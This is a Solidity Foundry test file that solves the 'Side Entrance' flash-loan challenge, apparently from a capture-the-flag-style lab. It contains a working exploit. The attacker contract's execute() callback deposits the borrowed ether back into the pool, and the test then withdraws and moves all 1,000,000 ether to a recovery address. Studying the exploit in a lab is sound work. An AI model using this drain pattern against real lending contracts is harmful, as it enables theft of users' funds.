
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test,console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract playerExecute{

    constructor(address _pool) {
    pool = SideEntranceLenderPool(_pool);
}

    SideEntranceLenderPool pool;

    function execute() public payable{

        (bool success, ) = address(pool).call{value: 1000000 ether}(
    abi.encodeCall(SideEntranceLenderPool.deposit, ())
);


    }

    receive() external payable {}
}



contract sideEntraceTest is Test {

    SideEntranceLenderPool pool;
     playerExecute player;
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");

    uint256 TOKEN_IN_POOL = 1000000 ether;
    uint256 TOKEN_IN_PLAYER = 1 ether;



    function setUp() public {

        pool = new SideEntranceLenderPool();
        player = new playerExecute(address(pool));

        startHoax(address(deployer));
        pool.deposit{value: TOKEN_IN_POOL}();
        vm.deal(address(player),TOKEN_IN_PLAYER);
        vm.stopPrank();


    }

    function test_SideEntrance() public{

        assertEq(address(pool).balance,1000000 ether);
        assertEq(address(player).balance,1 ether);

        vm.startPrank(address(player));

        pool.flashLoan(1000000 ether);

        pool.withdraw();

        (bool success,) = address(recovery).call{value:1000000 ether}("");

        vm.stopPrank();

        assertEq(address(pool).balance,0 ether);
        assertEq(address(player).balance,1 ether);
        assertEq(address(recovery).balance,1000000 ether);



        
    }



}
